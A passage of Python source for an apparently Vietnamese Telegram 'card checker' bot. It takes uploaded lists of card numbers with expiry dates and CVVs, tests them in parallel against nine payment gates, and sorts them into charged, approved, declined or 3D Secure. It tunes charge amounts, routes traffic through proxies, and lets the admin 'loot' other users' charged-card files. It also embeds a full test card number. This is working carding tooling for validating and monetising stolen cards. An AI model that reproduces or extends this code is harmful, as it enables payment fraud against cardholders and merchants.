        if results['decline']: final_message.extend(("\n**? DECLINED CARDS:**", *results['decline']))
        if results['invalid_format']: final_message.extend(("\n**?? INVALID FORMAT:**", *results['invalid_format']))
        if results['error']: final_message.extend(("\n**?? ERRORS:**", *results['error']))
        final_text = "\n".join(final_message)
        if len(final_text) > 4096:
            await status_message.edit_text("K?t qu? quá dài ð? hi?n th?. S? ðý?c g?i dý?i d?ng file.", reply_markup=None)
            with io.BytesIO(final_text.encode('utf-8')) as file_to_send:
                await context.bot.send_document(chat_id=update.effective_chat.id, document=file_to_send, filename="multi_check_results.txt")
        else:
            await status_message.edit_text(final_text, reply_markup=None)
    except Exception as e:
        logger.error(f"L?i trong /multi: {e}", exc_info=True)
        await status_message.edit_text(f"?? **L?i nghiêm tr?ng!**\n```\n{str(e).replace('`', '')}\n```", reply_markup=None)
    finally:
        ACTIVE_CHECKS.pop(user.id, None)
        CANCELLATION_EVENTS.pop(user.id, None)

async def mass_check_handler(update, context):
    user = update.effective_user
    if user.id != ADMIN_ID and user.id not in load_users():
        await update.message.reply_text(f"B?n không ðý?c phép s? d?ng l?nh này. Vui l?ng liên h? Admin: {ADMIN_USERNAME}")
        return
    if user.id != ADMIN_ID and not is_bot_on():
        lang = get_user_lang(user.id) or 'en'
        message = MESSAGES_VI["bot_off"] if lang == 'vi' else MESSAGES_EN["bot_off"]
        await update.message.reply_text(message)
        return
    if user.id in ACTIVE_CHECKS:
        logger.warning(f"User {user.id} ({user.full_name}) tried to spam /mass.")
        await update.message.reply_text("B?n ðang có m?t tác v? check khác ðang ch?y. Vui l?ng ch? nó hoàn thành ho?c dùng /stop.", quote=True)
        return
    if not update.message.document: await update.message.reply_text("Please attach a .txt file."); return
    document = update.message.document
    if not document.file_name.lower().endswith('.txt'): await update.message.reply_text("Only .txt files are accepted."); return
    file = await context.bot.get_file(document.file_id)
    file_content = (await file.download_as_bytearray()).decode('utf-8')
    lines = [line for line in file_content.splitlines() if line.strip()]
    total_lines = len(lines)
    if not lines: await update.message.reply_text("?? The file is empty."); return
    if user.id != ADMIN_ID:
        user_limit = get_user_limit(user.id)
        if total_lines > user_limit:
            await update.message.reply_text(
                f"?? **Vý?t quá gi?i h?n!**\n\n"
                f"T?p c?a b?n có `{total_lines}` d?ng, nhýng gi?i h?n c?a b?n là `{user_limit}` d?ng.\n\n"
                f"Vui l?ng liên h? admin {ADMIN_USERNAME} ð? tãng h?n m?c."
            )
            return
    caption = update.message.caption or "/mass"
    requested_threads_match = re.match(r'/mass(\d+)', caption)
    requested_threads = int(requested_threads_match.group(1)) if requested_threads_match and requested_threads_match.group(1) else 10
    if user.id != ADMIN_ID:
        num_threads = min(requested_threads, MEMBER_THREAD_LIMIT)
        if requested_threads > MEMBER_THREAD_LIMIT:
            await update.message.reply_text(
                f"?? **Gi?i h?n lu?ng!** Thành viên ch? ðý?c dùng t?i ða {MEMBER_THREAD_LIMIT} lu?ng. Ð? t? ð?ng ði?u ch?nh.",
                quote=True
            )
    else:
        num_threads = requested_threads
    num_threads = max(1, num_threads)
    active_gate = get_active_gate()
    gate_name = get_formatted_gate_name(active_gate)
    session_timestamp = datetime.now(VIETNAM_TZ).strftime("%Y%m%d-%H%M%S")
    session_dir = os.path.join(LOG_DIR, str(user.id), session_timestamp)
    os.makedirs(session_dir, exist_ok=True)
    keyboard = [[InlineKeyboardButton("?? D?ng Task C?a Tôi", callback_data=f"stop_mytask_{user.id}")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    status_message = await update.message.reply_text(f"? Kh?i t?o... Chu?n b? check `{total_lines}` th? v?i `{num_threads}` lu?ng qua **{gate_name}**.", reply_markup=reply_markup)
    start_time = time.time()
    cancel_event = threading.Event()
    try:
        ACTIVE_CHECKS[user.id] = { "full_name": user.full_name, "username": user.username, "start_time": time.time(), "task_type": "mass" }
        CANCELLATION_EVENTS[user.id] = cancel_event
        counts = {'success': 0, 'live_success': 0, 'decline': 0, 'custom': 0, 'error': 0, 'invalid_format': 0, 'unknown': 0, 'cancelled': 0, 'gate_dead': 0}
        result_lists = {k: [] for k in counts.keys()}
        result_lists['error_debug'] = []
        processed_count = 0
        last_update_time = time.time()
        gate_died_flag = False
        gate_fail_card = ""
        with ThreadPoolExecutor(max_workers=num_threads) as executor:
            future_to_line = {executor.submit(check_card, line, cancel_event): line for line in lines}
            for future in as_completed(future_to_line):
                if cancel_event.is_set():
                    break
                processed_count += 1
                try:
                    status, original_line, full_response, bin_info = future.result()
                    if status == 'gate_dead':
                        counts['gate_dead'] += 1
                        gate_fail_card = original_line
                        gate_died_flag = True
                        cancel_event.set()
                        result_lists['error'].append(f"{original_line} | GATE DIED (Forbidden)")
                        continue
                    counts[status] = counts.get(status, 0) + 1
                    line_to_save = ""
                    if status == 'decline':
                        if full_response == 'VIETNAM_BIN_DECLINE': line_to_save = f"{original_line} | DECLINED (VN BIN)"
                        elif full_response == 'INVALID_BIN_DECLINE': line_to_save = f"{original_line} | DECLINED (Invalid BIN)"
                        elif full_response == 'EXPIRED_CARD_DECLINE': line_to_save = f"{original_line} | DECLINED (Expired)"
                        elif full_response == 'INVALID_CARDNUMBER_DECLINE': line_to_save = f"{original_line} | DECLINED (Invalid Card Number)"
                        else: line_to_save = f"{original_line} | DECLINED"
                    elif status == 'live_success':
                        bin_str = f"| {(bin_info.get('bank') or 'N/A')} - {(bin_info.get('type') or 'N/A')} - {(bin_info.get('brand') or 'N/A')} - {(bin_info.get('country_name') or 'N/A')}"
                        line_to_save = f"{original_line} | APPROVED? {bin_str}"
                    elif status == 'invalid_format': line_to_save = f"{original_line} | Reason: {full_response}"
                    elif status == 'cancelled': continue
                    else:
                        bin_str = f"| {(bin_info.get('bank') or 'N/A')} - {(bin_info.get('type') or 'N/A')} - {(bin_info.get('brand') or 'N/A')} - {(bin_info.get('country_name') or 'N/A')}"
                        line_to_save = f"{original_line} {bin_str}"
                    if line_to_save: result_lists[status].append(line_to_save)
                    if status in ['error', 'unknown']:
                        debug_info = f"Card: {original_line}\nResponse: {str(full_response)[:3500]}"
                        result_lists['error_debug'].append(debug_info)
                        if user.id != ADMIN_ID:
                            await context.bot.send_message(chat_id=ADMIN_ID, text=f"?? DEBUG ALERT (user {user.id}):\n{debug_info}")
                except Exception as e:
                    original_line = future_to_line[future]
                    logger.error(f"L?i khi x? l? future cho th? {original_line} trong /mass: {e}", exc_info=True)
                    counts['error'] += 1
                    result_lists['error'].append(f"{original_line} | L?i x? l?: {e}")
                if time.time() - last_update_time > 2.0 or processed_count == total_lines:
                    progress_bar = create_progress_bar(processed_count, total_lines, length=20)
                    cpu_usage = psutil.cpu_percent()
                    ram_usage = psutil.virtual_memory().percent
                    status_lines = [
                        f"**?? Checking in progress...**\n{progress_bar}\n",
                        f"?? **CPU:** `{cpu_usage}%` | **RAM:** `{ram_usage}%`",
                        f"**Gate:** `{gate_name}` | **Threads:** `{num_threads}`",
                        f"**Progress:** `{processed_count}/{total_lines}`\n"
                    ]
                    if active_gate not in ['7', '8', '9'] or (active_gate == '8' and get_gate8_mode() == 'charge') or (active_gate == '9' and get_gate9_mode() == 'charge'):
                        status_lines.append(f"? **Charged:** `{counts['success']}`")
                    status_lines.extend([
                        f"? **Approved:** `{counts['live_success']}`",
                        f"? **Declined:** `{counts['decline']}`",
                        f"?? **3D Secure:** `{counts['custom']}`",
                        f"?? **Invalid Format:** `{counts['invalid_format']}`",
                        f"? **Errors:** `{counts['error']}`"
                    ])
                    status_text = "\n".join(status_lines)
                    try:
                        current_reply_markup = reply_markup if not cancel_event.is_set() else None
                        await status_message.edit_text(text=status_text, reply_markup=current_reply_markup)
                    except telegram.error.BadRequest as e:
                        if "Message is not modified" not in str(e): logger.warning(f"L?i khi c?p nh?t ti?n tr?nh /mass: {e}")
                        pass
                    except Exception as e:
                        logger.error(f"L?i không xác ð?nh khi c?p nh?t ti?n tr?nh /mass: {e}")
                    last_update_time = time.time()
        duration = time.time() - start_time
        counts['cancelled'] = total_lines - processed_count
        if gate_died_flag:
            final_summary_text = (
                f"?? **CHECK STOPPED - GATE DIED** ??\n\n"
                f"**Reason:** The gate is down (`Forbidden` error).\n"
                f"The process was stopped immediately.\n\n"
                f"**Gate Used:** `{gate_name}`\n"
                f"**Failing Card:** `{gate_fail_card}`\n"
                f"**Processed before stop:** `{processed_count}/{total_lines}`\n\n"
                f"Các k?t qu? ð? x? l? s? ðý?c g?i ði."
            )
        elif cancel_event.is_set():
            final_summary_text = (
                f"?? **Tác v? ð? ðý?c d?ng theo yêu c?u.**\n\n"
                f"Ð? x? l?: {processed_count}/{total_lines} th?. Các k?t qu? ð? x? l? s? ðý?c g?i ði."
            )
        else:
            summary_lines = [
                f"**?? Check Complete!**\n",
                f"**Gate Used:** `{gate_name}`",
                f"**Total:** `{total_lines}` | **Threads:** `{num_threads}`\n"
            ]
            if active_gate not in ['7', '8', '9'] or (active_gate == '8' and get_gate8_mode() == 'charge') or (active_gate == '9' and get_gate9_mode() == 'charge'):
                summary_lines.append(f"? **Charged:** `{counts['success']}`")
            summary_lines.extend([
                f"? **Approved:** `{counts['live_success']}`", f"? **Declined:** `{counts['decline']}`",
                f"?? **3D Secure:** `{counts['custom']}`", f"?? **Invalid Format:** `{counts['invalid_format']}`",
                f"? **Errors:** `{counts['error']}`", f"?? **Cancelled:** `{counts['cancelled']}`\n",
                f"**?? Took:** `{duration:.2f}s`"
            ])
            final_summary_text = "\n".join(summary_lines)
        await status_message.edit_text(final_summary_text, reply_markup=None)
        summary_data = {'counts': counts, 'original_filename': document.file_name}
        save_json_file(os.path.join(session_dir, "summary.json"), summary_data)
        update_user_stats(user.id, user, counts)
        file_map = {
            'success': 'charged.txt', 'live_success': 'approved.txt', 'decline': 'declined.txt',
            'custom': '3d_secure.txt', 'invalid_format': 'invalid_format.txt',
            'error': 'errors.txt', 'unknown': 'unknown.txt'
        }
        for status, filename in file_map.items():
            if result_lists[status]:
                file_path = os.path.join(session_dir, filename)
                with open(file_path, 'w', encoding='utf-8') as f: f.write("\n".join(result_lists[status]))
                with open(file_path, 'rb') as doc: await context.bot.send_document(chat_id=update.effective_chat.id, document=doc)
        if user.id == ADMIN_ID and result_lists['error_debug']:
            debug_path = os.path.join(session_dir, "debug_admin.txt")
            with open(debug_path, 'w', encoding='utf-8') as f: f.write("\n\n---\n\n".join(result_lists['error_debug']))
            with open(debug_path, 'rb') as doc: await context.bot.send_document(chat_id=ADMIN_ID, document=doc)
    except Exception as e:
        logger.error(f"L?i trong mass_check: {e}", exc_info=True)
        await status_message.edit_text(f"?? **L?i nghiêm tr?ng!**\n```\n{str(e).replace('`', '')}\n```", reply_markup=None)
    finally:
        ACTIVE_CHECKS.pop(user.id, None)
        CANCELLATION_EVENTS.pop(user.id, None)

async def stop_command(update, context):
    user = update.effective_user
    target_user_id = user.id
    if user.id == ADMIN_ID and context.args:
        try: target_user_id = int(context.args[0])
        except (ValueError, IndexError):
            await update.message.reply_text("? User ID không h?p l?. Cú pháp: `/stop <user_id>`"); return
    elif user.id != ADMIN_ID and user.id not in load_users():
        await update.message.reply_text("B?n không có quy?n dùng l?nh này."); return
    if target_user_id in CANCELLATION_EVENTS:
        CANCELLATION_EVENTS[target_user_id].set()
        if target_user_id == user.id:
            await update.message.reply_text("? Ð? g?i yêu c?u d?ng. Tác v? s? d?ng l?i sau khi hoàn thành các th? ðang check...")
        else:
            await update.message.reply_text(f"? Ð? g?i yêu c?u d?ng tác v? c?a ngý?i dùng `{target_user_id}`.")
    else:
        if target_user_id == user.id:
            await update.message.reply_text("?? B?n không có tác v? /mass ho?c /multi nào ðang ch?y.")
        else:
            await update.message.reply_text(f"?? Ngý?i dùng `{target_user_id}` không có tác v? nào ðang ch?y.")

async def active_checks_command(update, context):
    if update.effective_user.id != ADMIN_ID: return
    if not ACTIVE_CHECKS:
        await update.message.reply_text("? Hi?n không có tác v? check nào ðang ch?y.")
        return
    message = "????? **Các tác v? ðang ho?t ð?ng:**\n\n"
    now = time.time()
    keyboard = []
    active_checks_copy = dict(ACTIVE_CHECKS)
    for user_id, data in active_checks_copy.items():
        duration = now - data.get('start_time', now)
        username = f"@{data.get('username')}" if data.get('username') else "N/A"
        full_name = data.get('full_name', 'N/A')
        task_type = data.get('task_type', 'N/A').upper()
        message += (f"?? **User:** {full_name} ({username}) | ID: `{user_id}`\n"
                    f"   - **L?nh:** `/{task_type}`\n"
                    f"   - **Th?i gian ch?y:** `{int(duration)}` giây\n"
                    f"--------------------\n")
        keyboard.append([InlineKeyboardButton(f"?? D?ng Task c?a {full_name}", callback_data=f"stop_task_{user_id}")])
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(message, reply_markup=reply_markup)

def _perform_gate_check(gate_id: str, card_line: str):
    cc, mes, ano, cvv = card_line.split('|')
    ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    session = requests.Session()
    session.headers.update({"User-Agent": ua})
    try:
        bin_info = {}
        gate_functions = {
            '1': _check_card_gate1, '2': _check_card_gate2, '3': _check_card_gate3,
            '4': _check_card_gate4, '5': _check_card_gate5, '6': _check_card_gate6,
            '7': _check_card_gate7, '8': _check_card_gate8, '9': _check_card_gate9,
        }
        gate_func = gate_functions.get(gate_id)
        if not gate_func:
            return "Không xác ð?nh ?", "Gate ID không t?n t?i"
        status, _, response_text, _ = gate_func(session, card_line, cc, mes, f"20{ano}", cvv, bin_info, ua, None)
        if status == 'gate_dead' or '{"message":"Forbidden"}' in str(response_text):
            return "Không ho?t ð?ng ??", response_text
        elif '"payment_status":"failed"' in str(response_text) or '"payment_source_status":"failed"' in str(response_text) or status == 'live_success' or status == 'success' or status == 'decline':
            return "Ho?t ð?ng ??", response_text
        else:
            return "Ho?t ð?ng ??", response_text
    except Exception as e:
        logger.error(f"L?i khi ki?m tra tr?ng thái Gate {gate_id}: {e}")
        return "Không ho?t ð?ng ??", str(e)

async def status_command(update, context):
    if update.effective_user.id != ADMIN_ID: return
    msg = await update.message.reply_text("? Ðang ki?m tra tr?ng thái các c?ng... Vui l?ng ch?.")
    test_card = "4258818143133540|02|26|471"
    final_message = "**?? TR?NG THÁI C?NG THANH TOÁN ??**\n\n"
    gate_ids = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
    with ThreadPoolExecutor(max_workers=len(gate_ids)) as executor:
        future_to_gate = {executor.submit(_perform_gate_check, gid, test_card): gid for gid in gate_ids}
        results = {}
        for future in as_completed(future_to_gate):
            gid = future_to_gate[future]
            try:
                status, response = future.result()
                results[gid] = (status, response)
            except Exception as e:
                results[gid] = ("L?i ki?m tra ??", str(e))
    for gid in sorted(results.keys()):
        status, response = results.get(gid, ("Không xác ð?nh", "Không có k?t qu?"))
        response_display = str(response)[:1000]
        gate_name = get_formatted_gate_name(gid)
        final_message += (
            f"**C?ng {gid}: {gate_name.split('(')[0].strip()}**\n"
            f"**Tr?ng thái:** {status}\n"
            f"**Ph?n h?i Server:**\n```\n{response_display}\n```\n"
            f"----------------------------------------\n"
        )
    await msg.edit_text(final_message)

async def gate_command(update, context):
    if update.effective_user.id != ADMIN_ID: return
    if not context.args:
        current_gate = get_active_gate()
        current_gate_name = get_formatted_gate_name(current_gate)
        await update.message.reply_text(f"?? Gate ðang ho?t ð?ng: **{current_gate_name}**.\n\nDùng `/gate [1-9]` ð? thay ð?i.")
        return
    new_gate = context.args[0]
    if new_gate == '8':
        keyboard = [[InlineKeyboardButton("?? Charge", callback_data="setgate8mode_charge"), InlineKeyboardButton("? Check Live", callback_data="setgate8mode_live"),]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text("Vui l?ng ch?n ch? ð? cho **Gate 8**:", reply_markup=reply_markup)
    elif new_gate == '9':
        keyboard = [[InlineKeyboardButton("?? Charge", callback_data="setgate9mode_charge"), InlineKeyboardButton("? Check Live", callback_data="setgate9mode_live"),]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text("Vui l?ng ch?n ch? ð? cho **Gate 9**:", reply_markup=reply_markup)
    elif new_gate in ['1', '2', '3', '4', '5', '6', '7']:
        set_active_gate(new_gate)
        new_gate_name = get_formatted_gate_name(new_gate)
        await update.message.reply_text(f"? Ð? chuy?n c?ng thanh toán sang: **{new_gate_name}**")
    else:
        await update.message.reply_text("? C?ng không h?p l?. Vui l?ng ch?n `1`, `2`, `3`, `4`, `5`, `6`, `7`, `8` ho?c `9`.")

async def set_gate_range_command(update, context):
    if update.effective_user.id != ADMIN_ID: return
    if len(context.args) != 3:
        await update.message.reply_text("Cú pháp: `/setgate <gate_id> <min_amount> <max_amount>`\nVí d?: `/setgate 1 50 200` (charge t? 0.5$ ð?n 2.0$)")
        return
    try:
        gate_id, min_str, max_str = context.args
        if gate_id not in ['1', '2', '3', '4', '5', '6', '7', '8', '9']:
            await update.message.reply_text("? `gate_id` ph?i t? 1 ð?n 9.")
            return
        min_val = int(min_str)
        max_val = int(max_str)
        if min_val > max_val:
            await update.message.reply_text("? `min_amount` không ðý?c l?n hõn `max_amount`.")
            return
        if min_val < 0 or max_val < 0:
            await update.message.reply_text("? S? ti?n ph?i là s? dýõng.")
            return
    except (ValueError, IndexError):
        await update.message.reply_text("? D? li?u không h?p l?. Vui l?ng nh?p s? cho min và max.")
        return
    ranges = load_json_file(GATE_RANGES_FILE)
    ranges[gate_id] = {"min": min_val, "max": max_val}
    save_json_file(GATE_RANGES_FILE, ranges)
    new_gate_name = get_formatted_gate_name(gate_id)
    await update.message.reply_text(f"? Ð? c?p nh?t thành công!\n**Gate {gate_id}** gi? s? charge ng?u nhiên trong kho?ng **{min_val/100:.2f}$ - {max_val/100:.2f}$**.\nTên hi?n th? m?i: `{new_gate_name}`")

async def turn_bot_off(update, context):
    if update.effective_user.id != ADMIN_ID: return
    if not is_bot_on():
        await update.message.reply_text("?? Bot ð? ? tr?ng thái **T?t** r?i."); return
    set_bot_status(False)
    await update.message.reply_text("? Ð? **T?T** bot. B?t ð?u g?i thông báo...")
    authorized_users = load_users()
    success_count, fail_count = 0, 0
    for user_id in authorized_users:
        if user_id == ADMIN_ID: continue
        lang = get_user_lang(user_id) or 'en'
        message = MESSAGES_VI["bot_off"] if lang == 'vi' else MESSAGES_EN["bot_off"]
        try:
            await context.bot.send_message(chat_id=user_id, text=message)
            success_count += 1
        except Exception as e:
            fail_count += 1
            logger.warning(f"Không th? g?i thông báo t?t bot cho user {user_id}: {e}")
        await asyncio.sleep(0.1)
    await update.message.reply_text(f"?? Thông báo b?o tr? ð? ðý?c g?i.\n- Thành công: {success_count}\n- Th?t b?i: {fail_count}")

async def turn_bot_on(update, context):
    if update.effective_user.id != ADMIN_ID: return
    if is_bot_on():
        await update.message.reply_text("?? Bot ð? ? tr?ng thái **B?t** r?i."); return
    set_bot_status(True)
    await update.message.reply_text("? Ð? **B?T** bot. B?t ð?u g?i thông báo...")
    authorized_users = load_users()
    success_count, fail_count = 0, 0
    for user_id in authorized_users:
        if user_id == ADMIN_ID: continue
        lang = get_user_lang(user_id) or 'en'
        message = MESSAGES_VI["bot_on"] if lang == 'vi' else MESSAGES_EN["bot_on"]
        try:
            await context.bot.send_message(chat_id=user_id, text=message)
            success_count += 1
        except Exception as e:
            fail_count += 1
            logger.warning(f"Không th? g?i thông báo b?t bot cho user {user_id}: {e}")
        await asyncio.sleep(0.1)
    await update.message.reply_text(f"?? Thông báo ho?t ð?ng ð? ðý?c g?i.\n- Thành công: {success_count}\n- Th?t b?i: {fail_count}")

async def send_message_command(update, context):
    if update.effective_user.id != ADMIN_ID: return
    if len(context.args) < 2:
        await update.message.reply_text("Cú pháp: `/send <user_id> <tin_nh?n>`"); return
    try: target_user_id = int(context.args[0])
    except ValueError: await update.message.reply_text("? User ID không h?p l?."); return
    message_to_send = " ".join(context.args[1:])
    try:
        await context.bot.send_message(chat_id=target_user_id, text=f"?? **Tin nh?n t? Admin:**\n\n{message_to_send}")
        await update.message.reply_text(f"? Tin nh?n ð? ðý?c g?i ð?n user `{target_user_id}`.")
    except Exception as e:
        await update.message.reply_text(f"? G?i tin nh?n th?t b?i: `{e}`")

async def send_all_command(update, context):
    if update.effective_user.id != ADMIN_ID: return
    if not context.args:
        await update.message.reply_text("Cú pháp: `/sendall <tin_nh?n>`"); return
    message_to_send = " ".join(context.args)
    authorized_users = load_users()
    if not authorized_users:
        await update.message.reply_text("?? Không có thành viên nào ð? g?i tin."); return
    await update.message.reply_text(f"?? B?t ð?u g?i tin nh?n ð?n `{len(authorized_users)}` thành viên...")
    success_count, fail_count = 0, 0
    for user_id in authorized_users:
        if user_id == ADMIN_ID: continue
        try:
            await context.bot.send_message(chat_id=user_id, text=f"?? **Thông báo t? Admin:**\n\n{message_to_send}")
            success_count += 1
        except Exception as e:
            fail_count += 1
            logger.warning(f"Không th? g?i broadcast ð?n user {user_id}: {e}")
        await asyncio.sleep(0.1)
    await update.message.reply_text(f"?? G?i tin nh?n hoàn t?t!\n- Thành công: `{success_count}`\n- Th?t b?i: `{fail_count}`")

async def show_check_command(update, context):
    if update.effective_user.id != ADMIN_ID: return
    stats = load_json_file(STATS_FILE)
    if not stats:
        await update.message.reply_text("Chýa có d? li?u th?ng kê nào."); return
    message = "?? **TH?NG KÊ CHECK C?A USER** ??\n\n"
    all_users_to_show = load_users()
    all_users_to_show.add(ADMIN_ID)
    for user_id in sorted(list(all_users_to_show)):
        user_id_str = str(user_id)
        data = stats.get(user_id_str)
        if isinstance(data, dict):
            username = data.get('username')
            user_display = f"@{escape_markdown(str(username))}" if username else f"ID: {user_id_str}"
            message += (f"?? **{user_display}** (`{user_id_str}`)\n"
                        f"  ? Charged: `{data.get('total_charged', 0)}`\n"
                        f"  ? Approved: `{data.get('total_live_success', 0)}`\n"
                        f"  ?? Custom: `{data.get('total_custom', 0)}`\n"
                        f"  ? Declined: `{data.get('total_decline', 0)}`\n"
                        f"  ? L?i: `{data.get('total_error', 0) + data.get('total_invalid', 0)}`\n"
                        f"  ?? L?n cu?i: `{data.get('last_check_timestamp', 'Chýa check')}`\n"
                        f"--------------------\n")
        else:
            message += (f"?? **ID: {user_id_str}**\n"
                        f"  *Chýa t?ng check ho?c d? li?u l?i.*\n"
                        f"--------------------\n")
    if len(message) > 4096:
        with io.BytesIO(message.encode('utf-8')) as doc:
            await update.message.reply_document(document=doc, filename="stats.txt")
    else:
        await update.message.reply_text(message)


async def loot_file_command(update, context):
    if update.effective_user.id != ADMIN_ID: return
    if not context.args:
        await update.message.reply_text("Cú pháp: `/lootfile <user_id>`"); return
    target_user_id = context.args[0]
    user_log_dir = os.path.join(LOG_DIR, target_user_id)
    if not os.path.exists(user_log_dir) or not os.listdir(user_log_dir):
        await update.message.reply_text(f"Không t?m th?y l?ch s? check cho user `{target_user_id}`."); return
    keyboard = [
        [InlineKeyboardButton("1. L?y File Charge G?n Nh?t", callback_data=f"loot_latestcharge_{target_user_id}")],
        [InlineKeyboardButton("2. L?y T?t C? File Charge", callback_data=f"loot_allcharge_{target_user_id}")],
        [InlineKeyboardButton("3. Ch?n T? L?ch S?", callback_data=f"loot_history_{target_user_id}")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(f"Ch?n tùy ch?n ð? l?y file c?a user `{target_user_id}`:", reply_markup=reply_markup)

# <<<--- CÁC L?NH SITE CHECKER (Ð? S?A Ð?I) ---<<<
async def site_command(update, context):
    """X? l? l?nh /site b?ng cách g?i service site_checker.py."""
    user = update.effective_user
    if user.id != ADMIN_ID and user.id not in load_users():
        await update.message.reply_text(f"B?n không ðý?c phép s? d?ng l?nh này. Vui l?ng liên h? Admin: {ADMIN_USERNAME}")
        return

    if user.id != ADMIN_ID and not is_bot_on():
        lang = get_user_lang(user.id) or 'en'
        message = MESSAGES_VI["bot_off"] if lang == 'vi' else MESSAGES_EN["bot_off"]
        await update.message.reply_text(message)
        return

    if not context.args:
        await update.message.reply_text("S? d?ng: `/site <website.com>`")
        return

    url_input = context.args[0]
    msg = await update.message.reply_text(f"? Ðang ki?m tra trang `{url_input}`...")

    try:
        # D? li?u ð? g?i ð?n service
        payload = {
            "url": url_input,
            "username": user.username,
            "first_name": user.first_name
        }
        
        # G?i service b?ng requests (blocking) trong m?t thread riêng
        response = await asyncio.to_thread(
            requests.post, SITE_CHECKER_URL, json=payload, timeout=25
        )
        response.raise_for_status() # Báo l?i n?u status code là 4xx ho?c 5xx
        
        result_data = response.json()
        result_message = result_data.get("result", "L?i: Không nh?n ðý?c k?t qu? h?p l? t? service.")
        
        await msg.edit_text(result_message, disable_web_page_preview=True)

    except requests.exceptions.RequestException as e:
        logger.error(f"Không th? k?t n?i ð?n Site Checker Service: {e}")
        await msg.edit_text(f"?? **L?i Service:**\nKhông th? k?t n?i ð?n d?ch v? ki?m tra website. Vui l?ng báo cho admin: `{ADMIN_USERNAME}`")
    except Exception as e:
        logger.error(f"L?i trong /site command: {e}", exc_info=True)
        await msg.edit_text(f"?? **L?i H? Th?ng khi check site:**\n`{e}`")


async def sitem_command(update, context):
    """X? l? l?nh /sitem b?ng cách g?i service site_checker.py."""
    user = update.effective_user
    if user.id != ADMIN_ID and user.id not in load_users():
        await update.message.reply_text(f"B?n không ðý?c phép s? d?ng l?nh này. Vui l?ng liên h? Admin: {ADMIN_USERNAME}")
        return

    if user.id != ADMIN_ID and not is_bot_on():
        lang = get_user_lang(user.id) or 'en'
        message = MESSAGES_VI["bot_off"] if lang == 'vi' else MESSAGES_EN["bot_off"]
        await update.message.reply_text(message)
        return

    text_content = update.message.text.split('/sitem', 1)[-1].strip()
    if not text_content:
        await update.message.reply_text("S? d?ng: `/sitem` và dán danh sách website ? d?ng dý?i."); return

    url_pattern = r'(https?://)?([a-zA-Z0-9.-]+\.[a-zA-Z]{2,})'
    urls_to_check = [match[0] + match[1] for match in re.findall(url_pattern, text_content)]
    
    if not urls_to_check:
        await update.message.reply_text("Không t?m th?y URL h?p l? nào ð? check."); return

    max_urls = 10
    if len(urls_to_check) > max_urls:
        await update.message.reply_text(f"?? Quá nhi?u URL. Ch? x? l? {max_urls} URL ð?u tiên.")
        urls_to_check = urls_to_check[:max_urls]

    await update.message.reply_text(f"?? B?t ð?u ki?m tra `{len(urls_to_check)}` trang web...")

    for url in urls_to_check:
        try:
            payload = {"url": url, "username": user.username, "first_name": user.first_name}
            
            response = await asyncio.to_thread(
                requests.post, SITE_CHECKER_URL, json=payload, timeout=25
            )
            response.raise_for_status()
            
            result_data = response.json()
            result_message = result_data.get("result", f"L?i khi check {url}.")
            
            await update.message.reply_text(result_message, disable_web_page_preview=True)
            
        except requests.exceptions.RequestException as e:
            logger.error(f"L?i khi check URL {url} trong /sitem: {e}")
            await update.message.reply_text(f"?? L?i Service khi check `{url}`. Vui l?ng th? l?i sau.")
        except Exception as e:
            logger.error(f"L?i không xác ð?nh khi check URL {url} trong /sitem: {e}", exc_info=True)
            await update.message.reply_text(f"?? L?i khi check `{url}`: `{e}`")
        
        await asyncio.sleep(1)

# --- L?NH QU?N L? PROXY ---
async def on_proxy_command(update, context):
    if update.effective_user.id != ADMIN_ID: return
    proxies = load_proxies()
    proxies['enabled'] = True
    save_proxies(proxies)
    await update.message.reply_text("? Ð? **B?T** ch? ð? s? d?ng proxy. Các l?n check th? s? ðý?c th?c hi?n qua proxy ng?u nhiên.")

async def off_proxy_command(update, context):
    if update.effective_user.id != ADMIN_ID: return
    proxies = load_proxies()
    proxies['enabled'] = False
    save_proxies(proxies)
    await update.message.reply_text("?? Ð? **T?T** ch? ð? s? d?ng proxy. Các l?n check s? không dùng proxy.")

async def add_proxy_command(update, context):
    if update.effective_user.id != ADMIN_ID: return
    if not context.args:
        await update.message.reply_text("Cú pháp: `/addprx <proxy>`\nVí d?: `/addprx 123.45.67.89:8080` ho?c `/addprx ip:port:user:pass`")
        return
    proxy_str = context.args[0]
    parts = proxy_str.split(':')
    if len(parts) not in [2, 4]:
        await update.message.reply_text("? **Ð?nh d?ng không h?p l?.** Vui l?ng s? d?ng `ip:port` ho?c `ip:port:user:pass`.")
        return
    msg = await update.message.reply_text(f"? Ðang ki?m tra proxy `{proxy_str}`...")
    is_working, reason = await asyncio.to_thread(_test_proxy, proxy_str)
    if not is_working:
        await msg.edit_text(f"? **Proxy không ho?t ð?ng.**\nL? do: `{reason}`\nProxy chýa ðý?c thêm vào danh sách.")
        return
    proxies = load_proxies()
    if proxy_str in proxies['proxies']:
        await msg.edit_text(f"?? Proxy `{proxy_str}` ð? t?n t?i trong danh sách.")
        return
    proxies['proxies'].append(proxy_str)
    save_proxies(proxies)
    await msg.edit_text(f"? **Proxy ho?t ð?ng t?t và ð? ðý?c thêm!**\n- Proxy: `{proxy_str}`\n- T?ng s? proxy hi?n có: `{len(proxies['proxies'])}`")

async def delete_proxy_command(update, context):
    if update.effective_user.id != ADMIN_ID: return
    proxies = load_proxies().get('proxies', [])
    if not proxies:
        await update.message.reply_text("?? Danh sách proxy tr?ng.")
        return
    keyboard = []
    for i, proxy in enumerate(proxies):
        keyboard.append([InlineKeyboardButton(f"??? {proxy}", callback_data=f"delprx_{i}")])
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text("Ch?n proxy ð? xóa:", reply_markup=reply_markup)

async def test_proxy_command(update, context):
    if update.effective_user.id != ADMIN_ID: return
    proxies_data = load_proxies()
    proxies = proxies_data.get('proxies', [])
    status = "B?t" if proxies_data.get('enabled') else "T?t"
    if not proxies:
        await update.message.reply_text(f"?? Danh sách proxy tr?ng.\nTr?ng thái s? d?ng proxy: **{status}**")
        return
    keyboard = []
    for i, proxy in enumerate(proxies):
